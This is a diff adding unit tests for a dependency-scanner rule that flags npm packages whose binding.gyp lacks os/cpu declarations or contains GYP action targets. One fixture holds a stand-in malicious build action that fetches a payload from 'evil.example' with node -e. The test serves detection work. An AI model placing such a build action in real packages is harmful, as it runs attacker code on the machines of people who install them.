@@ -874,6 +874,146 @@ describe('native-binary rule', () => {
   });
 });
 
+describe('binding-gyp rule', () => {
+  it('flags a package with binding.gyp that has no os/cpu declaration (medium)', async () => {
+    const { bindingGypRule } = await import(
+      '../src/gates/dependency/rules/binding-gyp.js'
+    );
+    const dep = makeDep({ name: 'phantom', version: '1.0.0', resolved: 'https://registry.test/phantom.tgz', integrity: 'sha512-mock' });
+    const ctx = makeContext({
+      dependencies: [dep],
+      services: {
+        cache: makeContext().services.cache,
+        osv: stubOsv({}),
+        registry: stubRegistry({}),
+        tarballs: stubTarballs({
+          'phantom@1.0.0': buildExtracted([
+            { path: 'package.json', content: '{"name":"phantom"}' },
+            { path: 'binding.gyp', content: '{"targets":[{"target_name":"phantom","sources":["src/phantom.cc"]}]}' },
+          ]),
+        }),
+      },
+    });
+    const findings = await bindingGypRule.run(ctx);
+    expect(findings).toHaveLength(1);
+    expect(findings[0]?.severity).toBe('medium');
+    expect(findings[0]?.data?.hasActionTargets).toBe(false);
+  });
+
+  it('escalates to high when binding.gyp contains GYP action targets', async () => {
+    const { bindingGypRule } = await import(
+      '../src/gates/dependency/rules/binding-gyp.js'
+    );
+    const gypWithActions = JSON.stringify({
+      targets: [{
+        target_name: 'build',
+        sources: ['src/build.cc'],
+        actions: [{
+          action_name: 'run_setup',
+          action: ['node', '-e', 'require("http").get("http://evil.example/payload")'],
+          inputs: [],
+          outputs: [],
+        }],
+      }],
+    });
+    const dep = makeDep({ name: 'miasma-pkg', version: '2.0.0', resolved: 'https://registry.test/miasma-pkg.tgz', integrity: 'sha512-mock' });
+    const ctx = makeContext({
+      dependencies: [dep],
+      services: {
+        cache: makeContext().services.cache,
+        osv: stubOsv({}),
+        registry: stubRegistry({}),
+        tarballs: stubTarballs({
+          'miasma-pkg@2.0.0': buildExtracted([
+            { path: 'package.json', content: '{"name":"miasma-pkg"}' },
+            { path: 'binding.gyp', content: gypWithActions },
+          ]),
+        }),
+      },
+    });
+    const findings = await bindingGypRule.run(ctx);
+    expect(findings).toHaveLength(1);
+    expect(findings[0]?.severity).toBe('high');
+    expect(findings[0]?.data?.hasActionTargets).toBe(true);
+    expect(findings[0]?.title).toMatch(/Phantom Gyp/);
+  });
+
+  it('falls back to regex detection when binding.gyp is not valid JSON', async () => {
+    const { bindingGypRule } = await import(
+      '../src/gates/dependency/rules/binding-gyp.js'
+    );
+    // GYP format allows trailing commas and Python-style comments — not valid JSON
+    const gypNotJson = `{
+      'targets': [{
+        'target_name': 'addon',
+        'actions': [{'action_name': 'setup', 'action': ['node', 'setup.js'], 'inputs': [], 'outputs': []}],  # run it
+      }],
+    }`;
+    const dep = makeDep({ name: 'gyp-py', version: '1.0.0', resolved: 'https://registry.test/gyp-py.tgz', integrity: 'sha512-mock' });
+    const ctx = makeContext({
+      dependencies: [dep],
+      services: {
+        cache: makeContext().services.cache,
+        osv: stubOsv({}),
+        registry: stubRegistry({}),
+        tarballs: stubTarballs({
+          'gyp-py@1.0.0': buildExtracted([
+            { path: 'package.json', content: '{}' },
+            { path: 'binding.gyp', content: gypNotJson },
+          ]),
+        }),
+      },
+    });
+    const findings = await bindingGypRule.run(ctx);
+    expect(findings).toHaveLength(1);
+    expect(findings[0]?.severity).toBe('high');
+  });
+
+  it('allowlists packages that declare os/cpu in the manifest', async () => {
+    const { bindingGypRule } = await import(
+      '../src/gates/dependency/rules/binding-gyp.js'
+    );
+    const dep = makeDep({ name: 'real-native', version: '3.0.0', resolved: 'https://registry.test/real-native.tgz', integrity: 'sha512-mock' });
+    const ctx = makeContext({
+      dependencies: [dep],
+      services: {
+        cache: makeContext().services.cache,
+        osv: stubOsv({}),
+        registry: stubRegistry({}, {}, {}, {}, {}, {}, { 'real-native@3.0.0': { os: ['linux', 'darwin'], cpu: ['x64', 'arm64'] } }),
+        tarballs: stubTarballs({
+          'real-native@3.0.0': buildExtracted([
+            { path: 'package.json', content: '{"name":"real-native","os":["linux","darwin"]}' },
+            { path: 'binding.gyp', content: '{"targets":[{"target_name":"real-native","sources":["src/real.cc"]}]}' },
+          ]),
+        }),
+      },
+    });
+    expect(await bindingGypRule.run(ctx)).toHaveLength(0);
+  });
+
+  it('is silent for a package with no binding.gyp', async () => {
+    const { bindingGypRule } = await import(
+      '../src/gates/dependency/rules/binding-gyp.js'
+    );
+    const dep = makeDep({ name: 'pure-js', version: '1.0.0', resolved: 'https://registry.test/pure-js.tgz', integrity: 'sha512-mock' });
+    const ctx = makeContext({
+      dependencies: [dep],
+      services: {
+        cache: makeContext().services.cache,
+        osv: stubOsv({}),
+        registry: stubRegistry({}),
+        tarballs: stubTarballs({
+          'pure-js@1.0.0': buildExtracted([
+            { path: 'package.json', content: '{"name":"pure-js"}' },
+            { path: 'index.js', content: 'module.exports = 42;\n' },
+          ]),
+        }),
+      },
+    });
+    expect(await bindingGypRule.run(ctx)).toHaveLength(0);
+  });
+});
+
 describe('tarball-anomaly rule', () => {
   it('flags a version far larger than the package’s recent history', async () => {
     const { tarballAnomalyRule } = await import(
